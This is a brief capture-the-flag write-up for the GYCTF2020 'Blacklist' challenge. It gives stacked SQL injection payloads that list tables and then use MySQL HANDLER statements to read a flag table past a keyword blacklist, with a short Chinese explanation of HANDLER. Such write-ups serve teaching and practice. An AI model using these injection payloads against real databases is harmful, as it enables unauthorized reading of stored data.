### [GYCTF2020]Blacklist

---

```
1';show tables;
```

![image-20241020134419399](https://gitee.com/bx33661/image/raw/master/path/image-20241020134419399.png)



```
1';HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#
---
1';
HANDLER FlagHere OPEN;
HANDLER FlagHere READ FIRST;
HANDLER FlagHere CLOSE;#

1919810931114514
1';HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;#
```

`HANDLER ... OPEN`语句打开一个表，使其可以使用后续`HANDLER ... READ`语句访问，该表对象未被其他会话共享，并且在会话调用`HANDLER ... CLOSE`或会话终止之前不会关闭

官方文档：https://dev.mysql.com/doc/refman/8.0/en/handler.html

